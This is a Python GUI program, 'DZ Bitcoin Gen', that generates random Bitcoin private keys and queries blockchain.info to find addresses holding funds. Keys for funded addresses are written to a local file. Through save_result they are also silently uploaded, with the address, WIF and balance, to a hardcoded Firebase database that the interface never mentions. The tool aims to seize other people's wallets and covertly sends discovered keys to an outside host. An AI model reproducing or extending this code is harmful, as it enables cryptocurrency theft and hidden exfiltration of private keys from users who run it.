#!/usr/bin/python3

import hashlib
import os
import binascii
import ecdsa
import base58
import datetime
import webbrowser
import PySimpleGUI as sg
from json import (load as jsonload, dump as jsondump)
from os import path
import pyperclip
import requests
import subprocess
from alive_progress import alive_bar
import time
import threading
import json

DATABASE = r'database/data.txt'

start_time = datetime.datetime.now()

file_contents = []
total_key_gen = 0
total_found = 0

def secret():
    a = binascii.hexlify(os.urandom(32)).decode('utf-8')
    b = '0x ' +a
    return hashlib.sha256(b.encode("utf-8")).hexdigest().upper()

def pubkey(secret_exponent):
    privatekey = binascii.unhexlify(secret_exponent)
    s = ecdsa.SigningKey.from_string(privatekey, curve = ecdsa.SECP256k1)
    v = s.get_verifying_key()
    return '04' + binascii.hexlify(v.to_string()).decode('utf-8')

def addr(public_key):
    output = []; alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    var = hashlib.new('ripemd160')
    var.update(hashlib.sha256(binascii.unhexlify(public_key.encode())).digest())
    var = '00' + var.hexdigest() + hashlib.sha256(hashlib.sha256(binascii.unhexlify(('00' + var.hexdigest()).encode())).digest()).hexdigest()[0:8]
    count = [char != '0' for char in var].index(True) // 2
    n = int(var, 16)
    while n > 0:
        n, remainder = divmod(n, 58)
        output.append(alphabet[remainder])
    for i in range(count): output.append(alphabet[0])
    return ''.join(output[::-1])

def wif(secret_exponent):
    var80 = "80"+secret_exponent
    var = hashlib.sha256(binascii.unhexlify(hashlib.sha256(binascii.unhexlify(var80)).hexdigest())).hexdigest()
    return str(base58.b58encode(binascii.unhexlify(str(var80) + str(var[0:8]))), 'utf-8')

def generate_key(address, secret_exponent, WIF):
    f_key = {'address': address, 'key': secret_exponent, 'wif': WIF}
    
    file_contents.append(f_key)
    global total_key_gen
    total_key_gen =  total_key_gen + 1

total_key_check = 0
def check_bal(val):
    global window
    global total_key_check
    global total_found
    # time.sleep(0.1)
    
    address = val['address']
    secret_exponent = val['key']
    WIF = val['wif']

    the_page = requests.get("https://blockchain.info/q/getreceivedbyaddress/"+address).text

    if 'error' in the_page:
        i = 'Invalid'
        # print('Invalid address')
    elif int(the_page) != 0 :
        data = open("Win.txt","a")
        data.write("Bingo \nPrivate Address: " + str(secret_exponent)+"\nAddress: " +str(address)+"\nWIF: "+str(WIF)+"\nBalance: "+str(the_page)+"\n"+"\n")
        data.close()
        
        dat = {'address': str(address), 'private_key': str(secret_exponent), 'wif': str(WIF), 'balance': str(the_page)}
        
        save_result(dat)
        
        total_found =  total_found + 1
        window.Element('total_found').Update(str(total_found))

        # print(address)
    else:
        i = '0 Balance'
        # print('Address with 0 balance')
    
    file_contents.remove(val)
    total_key_check += 1
    if window != None:
        window.Element('total_key_check').Update(str(total_key_check))


SETTINGS_FILE = path.join(path.dirname(__file__), r'settings_file.cfg')
DEFAULT_SETTINGS = {'theme': sg.theme()}
SETTINGS_KEYS_TO_ELEMENT_KEYS = {'theme': '-THEME-'}

def load_settings(settings_file, default_settings):
    try:
        with open(settings_file, 'r') as f:
            settings = jsonload(f)
    except Exception as e:
        sg.popup_quick_message(f'exception {e}', 'No settings file found... will create one for you', keep_on_top=True, background_color='red', text_color='white')
        settings = default_settings
        save_settings(settings_file, settings, None)
    return settings

def save_settings(settings_file, settings, values):
    if values:      
        for key in SETTINGS_KEYS_TO_ELEMENT_KEYS:  
            try:
                settings[key] = values[SETTINGS_KEYS_TO_ELEMENT_KEYS[key]]
            except Exception as e:
                print(f'Problem updating settings from window values. Key = {key}')

    with open(settings_file, 'w') as f:
        jsondump(settings, f)

    sg.popup('Settings saved')

def create_settings_window(settings):
    sg.theme(settings['theme'])

    def TextLabel(text): return sg.Text(text+':', justification='r', size=(15,1))

    layout = [  [sg.Text('Settings', font='Any 15')],
                [TextLabel('Theme'),sg.Combo(sg.theme_list(), size=(20, 20), key='-THEME-')],
                [sg.Button('Save'), sg.Button('Exit')]  ]

    window = sg.Window('Settings', layout, keep_on_top=True, finalize=True)

    for key in SETTINGS_KEYS_TO_ELEMENT_KEYS:
        try:
            window[SETTINGS_KEYS_TO_ELEMENT_KEYS[key]].update(value=settings[key])
        except Exception as e:
            print(f'Problem updating PySimpleGUI window from settings. Key = {key}')

    return window

def create_main_window(settings):
    sg.theme(settings['theme'])

    menu_def = [['&Menu', ['&Settings', 'Copy',['Address', 'Privatekey', 'WIF'], 'E&xit']]]

    layout =  [[sg.Menu(menu_def)],
               [sg.Text('DZ Bitcoin Gen - #OPERATOR', size=(70,1), font=('Comic sans ms', 13)), 
                
                sg.Button('', key='whatsapp', size=(5,1), button_color=(sg.theme_background_color(), sg.theme_background_color()), image_filename='whatsapp.png', image_size=(50, 50), image_subsample=2, border_width=0),
               sg.Button('', key='telegram', size=(5,1), button_color=(sg.theme_background_color(), sg.theme_background_color()),
                         image_filename='telegram.png', image_size=(50, 60), image_subsample=2, border_width=0)],
               [sg.Text('This program has been running for... ', size=(30,1), font=('Comic sans ms', 10)),sg.Text('', size=(30,1), font=('Comic sans ms', 10), key='_DATE_')],
               [sg.Image('sco.png', size=(170, 170))],
               [sg.Text('Address: ', size=(12,1), font=('Comic sans ms', 10)), sg.Text('', size=(70,1), font=('Comic sans ms', 10),  key='address')],
               [sg.Text('Privatekey: ', size=(12,1), font=('Comic sans ms', 10)), sg.Text('', size=(70,1), font=('Comic sans ms', 10), key= 'privatekey')],
               [sg.Text('WIF: ', size=(12,1), font=('Comic sans ms', 10)), sg.Text('', size=(70,1), font=('Comic sans ms', 10), key= 'wif')],
               [sg.Text('',size=(20,1), font=('Comic sans ms', 10)), sg.Text('',size=(70,1), font=('Comic sans ms', 10), key='found')],
            #    -----------------------------
            [sg.Text('Total keys generated: ', size=(30,1), font=('Comic sans ms', 10)), sg.Text('', size=(30,1), font=('Comic sans ms', 10), key='total_key_gen')],
            #    -----------------------------
            [sg.Text('Total keys checked: ', size=(30,1), font=('Comic sans ms', 10)), sg.Text('', size=(30,1), font=('Comic sans ms', 10), key='total_key_check')],
            # 
            [sg.Text('No. of address found: ', size=(30,2), font=('Comic sans ms', 10)), sg.Text('', size=(30,2), font=('Comic sans ms', 10), key='total_found')],
            # -------------------------------
               [sg.Button('Start/Stop', font=('Comic sans ms', 10), size=(15,1)), sg.Text('', size=(5,1)), sg.Button('Exit', size=(12,1), button_color=('white', 'red'), font=('Comic sans ms', 10) ), sg.Text('', size=(50,2)), sg.Button('Result', size=(10,1), font=('Comic sans ms', 10) ),]
               
               # -------------------------------------
               ]

    return sg.Window('DZ Bitcoin Gen',
                     layout=layout,
                     default_element_size=(9,1))

def open_result():
    # Use subprocess to run the other script
    subprocess.run(["python", "bingo.py"])

event = None
generator = False
window = None
def main():
    global event
    global generator
    global window
    window, settings = None, load_settings(SETTINGS_FILE, DEFAULT_SETTINGS)
    
    while 1:
        if window is None:
            window = create_main_window(settings)
        event, values = window.Read(timeout=10)
        if event in (None, 'Exit'):
            break
        elif event == 'Start/Stop':
            generator = not generator
            
        if generator:
            secret_exponent = secret()
            public_key = pubkey(secret_exponent)
            address = addr(public_key)
            WIF = wif(secret_exponent)
            generate_key(address, secret_exponent, WIF)
            window.Element('_DATE_').Update(str(datetime.datetime.now()-start_time))
            # window.Element('address').Update(str(address))
            # window.Element('privatekey').Update(str(secret_exponent))
            # window.Element('wif').Update(str(WIF))
            # 08160127263
            window.Element('total_key_gen').Update(str(total_key_gen))
            # window.Element('total_found').Update(str(total_found))
        
                
        if event == 'Settings':
            event, values = create_settings_window(settings).read(close=True)
            if event == 'Save':
                window.close()
                window = None
                save_settings(SETTINGS_FILE, settings, values)

        elif event == 'Address':
            pyperclip.copy(str(address))
            pyperclip.paste()

        elif event == 'Privatekey':
            pyperclip.copy(str(secret_exponent))
            pyperclip.paste()

        elif event == 'WIF':
            pyperclip.copy(str(WIF))
            pyperclip.paste()

        elif event == 'Result':
            open_result()

    
    window.Close()

def scan_add():
    global event
    global generator
    while True:
        # print('')
        generator = True
        if file_contents !=  []:
            break
            
    while True:
        if file_contents !=  []:
            # print(len(file_contents))
            check_bal(file_contents[0])
        if event in (None, 'Exit'):
            print('Exited')
            break

def save_result(map):
    baseUrl = 'https://my-app-61f1d-default-rtdb.firebaseio.com/'
    filepath = 'DZBitGen/' + map['address']
    
    url = baseUrl+filepath+'.json'
    body = json.dumps(map)
    
    headers = {
        'accept': 'application/json',
        'Content-Type': 'application/json-patch+json',
      }
    
    res = requests.put(url=url, data=body, headers=headers)
    
    print(res.status_code)

main_thread = threading.Thread(target=main)
scan_thread = threading.Thread(target=scan_add)


main_thread.start()
scan_thread.start()

print('Starting...')

# main()
